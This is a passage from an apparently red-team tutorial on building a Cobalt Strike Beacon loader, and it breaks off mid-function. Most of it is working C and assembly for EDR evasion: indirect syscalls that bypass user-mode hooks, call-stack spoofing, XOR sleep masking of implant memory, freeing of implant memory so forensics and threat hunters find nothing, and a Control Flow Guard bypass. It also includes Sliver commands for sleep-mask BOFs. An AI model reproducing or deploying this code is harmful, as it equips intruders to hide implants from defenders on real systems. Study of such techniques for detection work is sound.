Start with a header that defines the syscall interface:

typedef struct {
    PVOID gate;
    DWORD ssn;
} SYSCALL;

BOOL resolve_syscall ( SYSCALL * syscall, PVOID ntdll, PVOID fn );
void prepare_syscall ( );
NTSTATUS do_syscall  ( );

The implementation in syscalls.c walks the Nt stub looking for the standard prologue mov r10, rcx; mov eax, <ssn>. If the stub has been hooked (an e9 JMP at the start), it walks up and down neighbouring stubs to recover the SSN by relative position. It then scans forward for the syscall; ret bytes to find a clean gate:

#include <windows.h>
#include "syscalls.h"
#include "tcg.h"

#define STUB_SIZE 32

#define UP   -STUB_SIZE
#define DOWN  STUB_SIZE

#define DEREF8(ptr) * ( ( PBYTE ) ptr )

/**
 * Get the SSN and address of the syscall instruction
 * for a given Nt* function
 */
BOOL resolve_syscall ( SYSCALL * syscall, PVOID ntdll, PVOID fn )
{
    /* parse headers */
    IMAGE_DOS_HEADER       * dos_header = ( IMAGE_DOS_HEADER * ) ntdll;
    IMAGE_NT_HEADERS       * nt_headers = ( IMAGE_NT_HEADERS * ) ( ( PBYTE ) ntdll + dos_header->e_lfanew );
    IMAGE_EXPORT_DIRECTORY * export_dir = ( IMAGE_EXPORT_DIRECTORY * ) ( ( PBYTE ) ntdll + nt_headers->OptionalHeader.DataDirectory[ 0 ].VirtualAddress );

    PDWORD addr_of_funcs = ( PDWORD ) ( ( PBYTE ) ntdll + export_dir->AddressOfFunctions );
    PWORD  addr_of_ords  = ( PWORD  ) ( ( PBYTE ) ntdll + export_dir->AddressOfNameOrdinals );

    /* init variables */
    PVOID stub     = fn, gate = NULL;
    DWORD ssn      = 0;
    WORD  idx_stub = 0, idx_name = 0;
    BOOL  hooked   = FALSE;

    for ( idx_stub = 0; idx_stub < STUB_SIZE; idx_stub++ )
    {
        /* e9 is a JMP */
        if ( DEREF8 ( stub + idx_stub ) == 0xe9 )
        {
            /* syscall is hooked */
            hooked = TRUE;
            break;
        }

        /* c3 is a RET */
        if ( DEREF8 ( stub + idx_stub ) == 0xc3 )
        {
            /* we've gone too far :( */
            return FALSE;
        }

        /*
        * 4c8bd1          mov     r10, rcx
        * b8??000000      mov     eax, ??
        */

        if ( DEREF8 ( stub + idx_stub     ) == 0x4c &&
             DEREF8 ( stub + idx_stub + 1 ) == 0x8b &&
             DEREF8 ( stub + idx_stub + 2 ) == 0xd1 &&
             DEREF8 ( stub + idx_stub + 3 ) == 0xb8 &&
             DEREF8 ( stub + idx_stub + 6 ) == 0x00 &&
             DEREF8 ( stub + idx_stub + 7 ) == 0x00 )
        {
            BYTE low  = DEREF8 ( stub + 4 + idx_stub );
            BYTE high = DEREF8 ( stub + 5 + idx_stub );

            ssn = ( high << 8 ) | low;

            break;
        }
    }

    if ( hooked )
    {
        /* check neighbouring functions */
        for ( idx_name = 1; idx_name <= export_dir->NumberOfFunctions; idx_name++ )
        {
            /* check next one down */
            if ( ( PBYTE ) stub + idx_name * DOWN < ( ( PBYTE ) ntdll + addr_of_funcs [ addr_of_ords [ export_dir->NumberOfFunctions - 1 ] ] ) )
            {
                if ( DEREF8 ( stub + idx_name * DOWN     ) == 0x4c &&
                     DEREF8 ( stub + 1 + idx_name * DOWN ) == 0x8b &&
                     DEREF8 ( stub + 2 + idx_name * DOWN ) == 0xd1 &&
                     DEREF8 ( stub + 3 + idx_name * DOWN ) == 0xb8 &&
                     DEREF8 ( stub + 6 + idx_name * DOWN ) == 0x00 &&
                     DEREF8 ( stub + 7 + idx_name * DOWN ) == 0x00 )
                {
                    BYTE low  = DEREF8 ( stub + 4 + idx_name * DOWN );
                    BYTE high = DEREF8 ( stub + 5 + idx_name * DOWN );
                    
                    ssn  = ( high << 8 ) | ( low - idx_name );
                    stub = ( PVOID ) ( ( PBYTE ) stub + idx_name * DOWN );

                    break;
                }
            }

            /* check next one up */
            if ( ( PBYTE ) stub + idx_name * UP > ( ( PBYTE ) ntdll + addr_of_funcs [ addr_of_ords [ 0 ] ] ) )
            {
                if ( DEREF8 ( stub + idx_name * UP     ) == 0x4c &&
                     DEREF8 ( stub + 1 + idx_name * UP ) == 0x8b &&
                     DEREF8 ( stub + 2 + idx_name * UP ) == 0xd1 &&
                     DEREF8 ( stub + 3 + idx_name * UP ) == 0xb8 &&
                     DEREF8 ( stub + 6 + idx_name * UP ) == 0x00 &&
                     DEREF8 ( stub + 7 + idx_name * UP ) == 0x00 )
                {
                    BYTE low  = DEREF8 ( stub + 4 + idx_name * UP );
                    BYTE high = DEREF8 ( stub + 5 + idx_name * UP );

                    ssn  = ( high << 8 ) | ( low + idx_name );
                    stub = ( PVOID ) ( ( PBYTE ) stub + idx_name * UP );

                    break;
                }
            }
        }
    }

    if ( stub && ssn )
    {
        /* search for the syscall; ret */
        for ( idx_stub = 0; idx_stub < STUB_SIZE; idx_stub++ )
        {
            /*
            * 0f05            syscall
            * c3              ret
            */

            if ( DEREF8 ( stub + idx_stub     ) == 0x0f &&
                 DEREF8 ( stub + idx_stub + 1 ) == 0x05 &&
                 DEREF8 ( stub + idx_stub + 2 ) == 0xc3 )
            {
                gate = ( LPVOID ) ( ( PBYTE ) stub + idx_stub );
                break;
            }
        }
    }

    if ( gate == NULL || ssn == 0 ) {
        return FALSE;
    }

    /* set syscall */
    syscall->gate = gate;
    syscall->ssn  = ssn;

    return TRUE;
}

/**
 * Prepare registers for syscall
 */
void __attribute__ ( ( naked ) ) prepare_syscall ( )
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "xor r11, r11;"
        "xor r10, r10;"
        "mov r11, rcx;"
        "mov r10, rdx;"
        "ret;"
        ".att_syntax prefix;"
    );
}

/**
 * Perform the syscall
 */
NTSTATUS __attribute__ ( ( naked ) ) do_syscall ( )
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "push r10;"
        "xor rax, rax;"
        "mov r10, rcx;"
        "mov eax, r11d;"
        "ret;"
        ".att_syntax prefix;"
    );
}

The VirtualAlloc hook now bypasses KernelBase entirely. Resolve NtAllocateVirtualMemory from ntdll, get the SSN and gate, then issue the syscall directly:

#include "syscalls.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc ( LPVOID, SIZE_T, DWORD, DWORD );

#define NTDLL_HASH                   0x3CFA685D
#define NTALLOCATEVIRTUALMEMORY_HASH 0xD33BCABD

LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    // get the base address of NTDLL
    PVOID ntdll = findModuleByHash ( NTDLL_HASH );
    
    // get a pointer to NtAllocateVirtualMemory
    PVOID ntavm = findFunctionByHash ( ntdll, NTALLOCATEVIRTUALMEMORY_HASH );

    SYSCALL syscall = { 0 };

    // try to resolve the SSN & syscall address
    if ( ! resolve_syscall ( &syscall, ntdll, ntavm ) ) {
        return NULL;
    }

    // prep the syscall 
    prepare_syscall ( syscall.ssn, syscall.gate );
    
    // perform the syscall
    do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, ( ULONG_PTR ) ( 0 ),  &dwSize, flAllocationType, flProtect );
  
    // return the result
    return lpAddress;
}

Add the syscalls COFF to the Makefile and merge it into the PICO:

$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/syscalls.c -o bin/syscalls.x64.o
# syscalls
load "bin/syscalls.x64.o"
    merge

This bypasses user-mode hooks but loses the spoofed call stack — the syscall now appears to come straight from the loader. To get both, we can pipe the indirect syscall through Draugr. The assembly stub already loads the SSN from the parameter struct:

; ----------------------------------------------------------------------
; Syscall stuff. Shouldn't affect performance even if a syscall isnt made
; ----------------------------------------------------------------------
mov r10, rcx
mov rax, [ rdi + 72 ]

Offset +72 is the Ssn field on DRAUGR_PARAMETERS:

typedef struct {
    PVOID Fixup;                            // 0
    PVOID OriginalReturnAddress;            // 8
    PVOID Rbx;                              // 16
    PVOID Rdi;                              // 24 
    PVOID BaseThreadInitThunkStackSize;     // 32 
    PVOID BaseThreadInitThunkReturnAddress; // 40
    PVOID TrampolineStackSize;              // 48
    PVOID RtlUserThreadStartStackSize;      // 56
    PVOID RtlUserThreadStartReturnAddress;  // 64
    PVOID Ssn;                              // 72
    PVOID Trampoline;
    PVOID Rsi;
    PVOID R12;
    PVOID R13;
    PVOID R14;
    PVOID R15;
} DRAUGR_PARAMETERS;

Add an ssn field to FUNCTION_CALL so the hooks can pass it through:

typedef struct {
    PVOID     ptr;
    DWORD     ssn;  // add this
    int       argc;
    ULONG_PTR args [ 10 ];
} FUNCTION_CALL;

Add a DWORD ssn parameter to draugr_wrapper:

ULONG_PTR draugr_wrapper ( PVOID function, DWORD ssn, ... etc ... )

Inside the wrapper, set Ssn on the parameter struct (only when non-zero, so non-syscall paths still work):

DRAUGR_PARAMETERS draugr_params = { 0 };

if ( ssn ) {
    draugr_params.Ssn = ( PVOID ) ( ULONG_PTR ) ssn;
}

...

And update spoof_call to forward the SSN:

ULONG_PTR spoof_call ( FUNCTION_CALL * call )
{
    if ( call->argc == 0 ) {
        return draugr_wrapper ( call->ptr, call->ssn, ... etc ... )

The hook now sets call.ptr to the syscall gate address (not the API), and call.ssn to the resolved SSN. Draugr lays down the spoofed stack frames as before, then executes syscall through the gate with our SSN in eax — user-mode hooks bypassed, call stack spoofed:

LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    PVOID ntdll = findModuleByHash   ( NTDLL_HASH );
    PVOID ntavm = findFunctionByHash ( ntdll, NTALLOCATEVIRTUALMEMORY_HASH );

    SYSCALL syscall = { 0 };

    if ( ! resolve_syscall ( &syscall, ntdll, ntavm ) ) {
        /*
        * instead of returning NULL, maybe
        * fall back to spoofing a call to
        * directly to VirtualAlloc
        */
        return NULL;
    }

    FUNCTION_CALL call = { 0 };

    call.ptr  = syscall.gate; /* address of syscall instruction */
    call.ssn  = syscall.ssn;  /* the syscall ssn */
    call.argc = 6;
    
    call.args [ 0 ] = spoof_arg ( ( HANDLE ) ( -1 ) );
    call.args [ 1 ] = spoof_arg ( &lpAddress );
    call.args [ 2 ] = spoof_arg ( 0 );
    call.args [ 3 ] = spoof_arg ( &dwSize );
    call.args [ 4 ] = spoof_arg ( flAllocationType );
    call.args [ 5 ] = spoof_arg ( flProtect );

    spoof_call ( &call );

    return lpAddress;
}

4.3 Memory Obfuscation

Beacon's strings and code patterns are signatured. Even after stripping known strings at build time, memory scanners can still match against decompressed Beacon sections at runtime. The fix is to obfuscate Beacon's memory while it's asleep. We can also flip RX pages to RW during the sleep cycle to hide that any code is executing from that region. The high-level flow:

Sliver equivalent: Sliver beacon-mode implants check in at a configurable interval (--seconds / --jitter), but don't natively mask their own memory between checks. The realistic path is to inject a sleep-mask BOF that wraps each beacon cycle:

# Install a community sleep mask (Foliage / Ekko / DeathSleep ports)
sliver > armory install foliage

# Use the BOF as the implant's sleep wrapper
sliver (SESSION) > execute-bof /opt/bofs/foliage.x64.o

# Or rebuild the implant with sleep encryption integrated into the binary
$ git clone https://github.com/BishopFox/sliver
# patch implant/sliver/transports/beacon/beacon.go to call Ekko before time.Sleep
  1. Hook KERNEL32$Sleep.
  2. Walk Beacon's sections (.text, .rdata, etc.).
  3. Obfuscate each section (XOR, RC4, whatever).
  4. Call the real Sleep.
  5. De-obfuscate each section.
  6. Return to Beacon.

For the PICO to know what to mask, the loader has to pass it the memory layout. Define a set of structures in memory.h to describe regions and their sections. We track our own PICO too — it's needed for memory cleanup later:

typedef struct {
    PVOID  BaseAddress;
    SIZE_T Size;
    DWORD  CurrentProtect;
    DWORD  PreviousProtect;
} MEMORY_SECTION;

typedef struct {
    PVOID          BaseAddress;
    SIZE_T         Size;
    MEMORY_SECTION Sections [ 8 ];
} MEMORY_REGION;

typedef struct {
    MEMORY_REGION Pico;
    MEMORY_REGION Dll;
} MEMORY_LAYOUT;

The masking interface lives in mask.h — one function that masks or unmasks based on the boolean flag:

void mask_memory ( MEMORY_LAYOUT * memory, BOOL mask );

The implementation in mask.c uses a 128-byte XOR key (patched in at link-time from the spec file), and flips section permissions to RW before masking. Sections that aren't writable already get a VirtualProtect first, with the original protection saved for restoration:

#include <windows.h>
#include "memory.h"
#include "spoof.h"

DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep          ( DWORD );
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

/* 
 * a random key will get patched
 * in from the specification file
 */
char xorkey [ 128 ] = { 1 };

void apply_mask ( char * data, DWORD len )
{
    for ( DWORD i = 0; i < len; i++ )
    {
        data [ i ] ^= xorkey [ i % 128 ];
    }
}

BOOL is_writeable ( DWORD protection )
{
    if ( protection == PAGE_EXECUTE_READWRITE ||
         protection == PAGE_EXECUTE_WRITECOPY ||
         protection == PAGE_READWRITE ||
         protection == PAGE_WRITECOPY )
    {
        return TRUE;
    }

    return FALSE;
}

void xor_section ( MEMORY_SECTION * section, BOOL mask )
{
    /* if we're masking and the section needs to be made writeable */
    if ( mask == TRUE && is_writeable ( section->CurrentProtect ) == FALSE )
    {
        DWORD old_protect = 0;

        /* set the section permissions to RW */
        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, PAGE_READWRITE, &old_protect ) )
        {
            /* 
             * store the old protection so
             * it can be set back later
             */
            section->CurrentProtect  = PAGE_READWRITE;
            section->PreviousProtect = old_protect;
        }
    }

    if ( is_writeable ( section->CurrentProtect ) )
    {
        /* section is writeable, so XOR it */
        apply_mask ( section->BaseAddress, section->Size );
    }

    /* if we're unmasking and the section permissions need to be set back */
    if ( mask == FALSE && section->CurrentProtect != section->PreviousProtect )
    {
        DWORD old_protect = 0;

        /* set the section permissions back to PreviousProtect */
        if ( KERNEL32$VirtualProtect ( section->BaseAddress, section->Size, section->PreviousProtect, &old_protect ) )
        {
            section->CurrentProtect  = section->PreviousProtect;
            section->PreviousProtect = old_protect;
        }
    }
}

void xor_region ( MEMORY_REGION * region, BOOL mask )
{
    for ( int i = 0; i < 8; i++ )
    {
        /* XOR each section */
        xor_section ( ®ion->Sections [ i ], mask );
    }
}

void mask_memory ( MEMORY_LAYOUT * memory, BOOL mask )
{
    /* XOR the DLL region */
    xor_region ( &memory->Dll, mask );
}

In pico.c, add a setup_memory export that takes the layout from the loader and stores a copy. The PICO needs its own copy because the loader will be freed once Beacon is running. The _Sleep hook then masks before calling the real sleep and unmasks after — gated on a 1-second minimum so short sleeps don't pay the masking cost:

#include <windows.h>
#include "memory.h"
#include "mask.h"
#include "spoof.h"
#include "tcg.h"

/* store as a global */
MEMORY_LAYOUT g_memory;

DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep ( DWORD );

void setup_hooks ( IMPORTFUNCS * funcs )
{
    funcs->GetProcAddress = ( __typeof__ ( GetProcAddress ) * ) _GetProcAddress;
}

void setup_memory ( MEMORY_LAYOUT * layout )
{
    if ( layout != NULL ) {
        /*
         * take poiner from loader
         * and dereference a copy
         */
        g_memory = * layout;
    }
}

/* 
 * throw this hook in here because
 * sharing a global across multiple
 * modules is still a bit of a headache
 */

VOID WINAPI _Sleep ( DWORD dwMilliseconds )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
    call.argc = 1;
    
    call.args [ 0 ] = spoof_arg ( dwMilliseconds );

    /*
     * for performance reasons, only mask
     * memory if sleep time is equal to
     * or greater than 1 second 
     */

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, TRUE );
    }

    spoof_call ( &call );

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, FALSE );
    }
}

In the loader, add the tag and typedef for setup_memory:

int __tag_setup_memory ( );
typedef void ( * SETUP_MEMORY ) ( MEMORY_LAYOUT * layout );

After the PICO is loaded, track its sections in the memory layout. The PICO's data section is RW and the code section is RX:

/* load it into memory */
PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );

/* make code section RX */
DWORD old_protect;
KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

/* begin tracking memory allocations */
MEMORY_LAYOUT memory    = { 0 };

/* set the PICO's base address and total size */
memory.Pico.BaseAddress = ( PVOID ) ( pico_dst );
memory.Pico.Size        = sizeof ( PICO );

/* use section 0 for the data section */
memory.Pico.Sections[ 0 ].BaseAddress     = ( PVOID ) ( pico_dst->data );
memory.Pico.Sections[ 0 ].Size            = PicoDataSize ( pico_src );
memory.Pico.Sections[ 0 ].CurrentProtect  = PAGE_READWRITE;
memory.Pico.Sections[ 0 ].PreviousProtect = PAGE_READWRITE;

/* use section 1 for the code section */
memory.Pico.Sections[ 1 ].BaseAddress     = ( PVOID ) ( pico_dst->code );
memory.Pico.Sections[ 1 ].Size            = PicoCodeSize ( pico_src );
memory.Pico.Sections[ 1 ].CurrentProtect  = PAGE_EXECUTE_READ;
memory.Pico.Sections[ 1 ].PreviousProtect = PAGE_EXECUTE_READ;

After Beacon's DLL is loaded, record its base and size as the second region:

LoadDLL ( &dll_data, dll_src, dll_dst );

/* track dll's memory */
memory.Dll.BaseAddress = ( PVOID ) ( dll_dst );
memory.Dll.Size        = SizeOfDLL ( &dll_data );

Extend fix_section_permissions to record each section into the region as it sets the new protection flags:

void fix_section_permissions ( DLLDATA * dll, char * src, char * dst, MEMORY_REGION * region )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        ...

        /* set new permission */
        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );

        /* track memory */
        region->Sections[ i ].BaseAddress     = section_dst;
        region->Sections[ i ].Size            = section_size;
        region->Sections[ i ].CurrentProtect  = new_protect;
        region->Sections[ i ].PreviousProtect = new_protect;

        /* advance to section */
        section_hdr++;
    }
}

Pass the DLL's region when invoking it:

fix_section_permissions ( &dll_data, dll_src, dll_dst, &memory.Dll );

With both regions populated, call setup_memory on the PICO so it has the full map:

/* call setup_memory to give PICO the memory info */
( ( SETUP_MEMORY ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_memory ( ) ) ) ( &memory );

The pico.spec wires everything in: merge mask.x64.o, generate a random 128-byte XOR key and patch it into the xorkey array, export setup_memory, and add the Sleep hook. Critically, also use attach for VirtualProtect — the addhook/__resolve_hook path only applies to the Beacon DLL, so the PICO's own VirtualProtect calls in xor_section would otherwise bypass call stack spoofing:

# merge mask
load "bin/mask.x64.o"
    merge

# generate and patch in a random key
generate $KEY 128
patch "xorkey" $KEY

# export setup_memory   
exportfunc "setup_memory" "__tag_setup_memory"

# add hook for Sleep
addhook "KERNEL32$Sleep" "_Sleep"
x64:
    load "bin/pico.x64.o"
        make object +disco
    
    # merge the hook functions
    load "bin/hooks.x64.o"
        merge

    # merge the call stack spoofing
    load "bin/spoof.x64.o"
        merge

    # merge the asm stub
    load "bin/draugr.x64.bin"
        linkfunc "draugr_stub"

    # merge mask
    load "bin/mask.x64.o"
        merge

    # generate and patch in a random key
    generate $KEY 128
    patch "xorkey" $KEY

    # export setup_hooks and setup_memory
    exportfunc "setup_hooks"  "__tag_setup_hooks"
    exportfunc "setup_memory" "__tag_setup_memory"

    # hook functions in the DLL
    addhook "WININET$InternetConnectA"    "_InternetConnectA"
    addhook "KERNEL32$Sleep"              "_Sleep"

    # hook functions in pico
    attach "KERNEL32$VirtualProtect" "_VirtualProtect"  # this is needed to hook VirtualProtect in mask.c

    mergelib "../libtcg.x64.zip"

    export

4.4 Memory Cleanup

Beacon's spawn command creates a new process and injects shellcode into it, while inject targets an existing process. They differ in how they tear down:

CommandExit APIResult
spawnExitProcessEntire process terminates; OS reclaims all memory
injectExitThreadOnly the Beacon thread exits; memory stays mapped in the host process

The inject case leaves Beacon and the PICO sitting in memory where forensics or threat hunters can find them. We could mask everything before exiting, but freeing is cleaner. The catch: the PICO can't free itself synchronously because the calling thread would return into freed memory. The workaround is to schedule the free on a timer queue — the threadpool thread does it while the original thread cleanly returns through ExitThread.

Define the cleanup interface in cleanup.h:

void cleanup_memory ( MEMORY_LAYOUT * memory );

The implementation in cleanup.c uses RtlCaptureContext to grab a valid CONTEXT from a timer thread (so the register values are sane), duplicates it twice, and rewrites Rip/Rcx/Rdx/R8 on each copy to build calls to VirtualFree — one for the DLL, one for the PICO. Two more timers fire NtContinue with each context as input, with a 500ms delay so the real ExitThread can complete first:

#include <windows.h>
#include "memory.h"
#include "tcg.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateTimerQueue      ( );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateTimerQueueTimer ( PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$ExitThread            ( DWORD );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap        ( );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc             ( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$RtlCaptureContext     ( PCONTEXT );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep                 ( DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree           ( LPVOID, SIZE_T, DWORD );

DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue               ( CONTEXT *, BOOLEAN );

#define memcpy(x, y, z) __movsb ( ( unsigned char * ) x, ( unsigned char * ) y, z );

void cleanup_memory ( MEMORY_LAYOUT * memory )
{
    CONTEXT ctx      = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    HANDLE timer_queue = KERNEL32$CreateTimerQueue ( ), timer = NULL;

    if ( KERNEL32$CreateTimerQueueTimer ( &timer, timer_queue, ( WAITORTIMERCALLBACK ) ( KERNEL32$RtlCaptureContext ), &ctx, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
    {
        /* give RtlCaptureContext a chance to run */
        KERNEL32$Sleep ( 100 );
            
        if ( ctx.Rip != 0 )
        {
            HANDLE    heap     = KERNEL32$GetProcessHeap ( );
            CONTEXT * ctx_free = ( CONTEXT * ) KERNEL32$HeapAlloc ( heap, HEAP_ZERO_MEMORY, sizeof ( CONTEXT ) * 2 );

            for ( int i = 0; i < 2; i++ ) { 
                memcpy ( &ctx_free [ i ], &ctx, sizeof ( CONTEXT ) );
            }

            /*
             * we use VirtualFree here because
             * the loader uses VirtualAlloc
             */

            /* the dll */
            ctx_free[ 0 ].Rsp -= sizeof ( PVOID );
            ctx_free[ 0 ].Rip = ( DWORD64 ) ( KERNEL32$VirtualFree );
            ctx_free[ 0 ].Rcx = ( DWORD64 ) ( memory->Dll.BaseAddress );
            ctx_free[ 0 ].Rdx = ( DWORD64 ) ( 0 );
            ctx_free[ 0 ].R8  = ( DWORD64 ) ( MEM_RELEASE );

            /* this pico */
            ctx_free[ 1 ].Rsp -= sizeof ( PVOID );
            ctx_free[ 1 ].Rip = ( DWORD64 ) ( KERNEL32$VirtualFree );
            ctx_free[ 1 ].Rcx = ( DWORD64 ) ( memory->Pico.BaseAddress );
            ctx_free[ 1 ].Rdx = ( DWORD64 ) ( 0 );
            ctx_free[ 1 ].R8  = ( DWORD64 ) ( MEM_RELEASE );

            /* give a decent delay so ExitThread has time to be called */
            KERNEL32$CreateTimerQueueTimer ( &timer, timer_queue, ( WAITORTIMERCALLBACK ) ( NTDLL$NtContinue ), &ctx_free [ 0 ], 500, 0, WT_EXECUTEINTIMERTHREAD );
            KERNEL32$CreateTimerQueueTimer ( &timer, timer_queue, ( WAITORTIMERCALLBACK ) ( NTDLL$NtContinue ), &ctx_free [ 1 ], 500, 0, WT_EXECUTEINTIMERTHREAD );
        }
    }
}

Wire it into the PICO's _ExitThread hook — trigger the cleanup, then forward to the real ExitThread via the spoofed proxy:

#include "cleanup.h"

VOID WINAPI _ExitThread ( DWORD dwExitCode )
{
    /* free memory */
    cleanup_memory ( &g_memory );

    /* call the real exit thread */
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$ExitThread );
    call.argc = 1;
    
    call.args [ 0 ]  = spoof_arg ( dwExitCode );

    spoof_call ( &call );
}

And add the ExitThread hook to pico.spec:

# hook functions in the DLL
addhook "WININET$InternetConnectA"  "_InternetConnectA"
addhook "KERNEL32$ExitThread"       "_ExitThread"
addhook "KERNEL32$Sleep"            "_Sleep"

4.5 Control Flow Guard

The cleanup code above works against most processes but breaks against any process built with Control Flow Guard (CFG). CFG only allows indirect calls to land at registered targets, called from valid call sites. We're setting Rip to VirtualFree (a CFG target) and dispatching via NtContinue — but NtContinue isn't a valid CFG call site, so the OS raises a CFG violation and kills the process.

The bypass is essentially "use the OS API to register NtContinue as a valid call site." NtSetInformationVirtualMemory with VmCfgCallTargetInformation does exactly that. The header declares two helpers:

BOOL cfg_enabled ( );
BOOL bypass_cfg ( PVOID address );

The implementation in cfg.c: cfg_enabled queries NtQueryInformationProcess with ProcessCookie | ProcessUserModeIOPL to read the process CFG policy. bypass_cfg resolves the page containing the target address, builds a CFG_CALL_TARGET_INFO with the appropriate offset, and submits it via NtSetInformationVirtualMemory. The size parameter quirk (24 vs sizeof) handles older Windows builds:

#include <windows.h>

#define NT_SUCCESS(status) ( ( NTSTATUS ) ( status ) >= 0 )
#define NtCurrentProcess() ( ( HANDLE ) ( ULONG_PTR ) -1 )

typedef struct {
    ULONG ExtendedProcessInfo;
    ULONG ExtendedProcessInfoBuffer;
} EXTENDED_PROCESS_INFORMATION;

typedef enum {
    ProcessUserModeIOPL = 16,
    ProcessCookie = 36
} PROCESSINFOCLASS;

typedef struct {
    DWORD                 dwNumberOfOffsets;
    PULONG                plOutput;
    PCFG_CALL_TARGET_INFO ptOffsets;
    PVOID                 pMustBeZero;
    PVOID                 pMoarZero;
} VM_INFORMATION;

typedef enum {
    VmPrefetchInformation,
    VmPagePriorityInformation,
    VmCfgCallTargetInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct {
    PVOID  VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY;

typedef enum {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess     ( HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG );
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory          ( HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T );
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetInformationVirtualMemory ( HANDLE, VIRTUAL_MEMORY_INFORMATION_CLASS, SIZE_T, MEMORY_RANGE_ENTRY *, PVOID, ULONG );

BOOL cfg_enabled ( )
{
    EXTENDED_PROCESS_INFORMATION proc_info = { 0 };

    NTSTATUS status = 0;

    proc_info.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    proc_info.ExtendedProcessInfoBuffer = 0;

    status = NTDLL$NtQueryInformationProcess ( NtCurrentProcess ( ), ProcessCookie | ProcessUserModeIOPL, &proc_info, sizeof ( proc_info ), NULL );

    if ( ! NT_SUCCESS ( status ) ) {
        return FALSE; 
    } 

    return proc_info.ExtendedProcessInfoBuffer;
}

BOOL bypass_cfg ( PVOID address )
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    VM_INFORMATION           vmi = { 0 };
    MEMORY_RANGE_ENTRY       mre = { 0 };
    CFG_CALL_TARGET_INFO     cti = { 0 };

    NTSTATUS status = NTDLL$NtQueryVirtualMemory ( NtCurrentProcess ( ), address, MemoryBasicInformation, &mbi, sizeof ( mbi ), 0 );

    if ( ! NT_SUCCESS ( status ) ) {
        return FALSE;
    }

    if ( mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE ) {
        return FALSE;
    }

    cti.Offset = ( ULONG_PTR ) address - ( ULONG_PTR ) mbi.BaseAddress;
    cti.Flags  = CFG_CALL_TARGET_VALID;

    mre.NumberOfBytes  = ( SIZE_T ) mbi.RegionSize;
    mre.VirtualAddress = ( PVOID ) mbi.BaseAddress;

    ULONG output = 0;

    vmi.dwNumberOfOffsets = 0x1;
    vmi.plOutput          = &output;
    vmi.ptOffsets         = &cti;
    vmi.pMustBeZero       = 0x0;
    vmi.pMoarZero         = 0x0;

    status = NTDLL$NtSetInformationVirtualMemory ( NtCurrentProcess ( ), VmCfgCallTargetInformation, 1, &mre, ( PVOID ) &vmi, ( ULONG ) sizeof ( vmi ) );

    if ( status == 0xC00000F4 )
    {
        /* the size parameter is not valid. try 24 instead, which is a known size for older windows versions */
        status = NTDLL$NtSetInformationVirtualMemory ( NtCurrentProcess ( ), VmCfgCallTargetInformation, 1, &mre, ( PVOID ) &vmi, 24 );
    }

    if ( ! NT_SUCCESS ( status ) )
    {
        /* STATUS_INVALID_PAGE_PROTECTION - CFG wasn't enabled */ 
        if ( status == 0xC0000045 )
        {
            /* pretend we bypassed it so timers can continue */
            return TRUE;
        }

        return FALSE;
    }

    return TRUE;
}

Update cleanup_memory to gate the timer setup on a successful CFG bypass — if CFG is enabled and the bypass fails, abort cleanup rather than crash:

void cleanup_memory ( MEMORY_LAYOUT * memory )
{
    /* is cfg enabled? */
    BOOL enabled = cfg_enabled ( );

    if ( enabled ) {
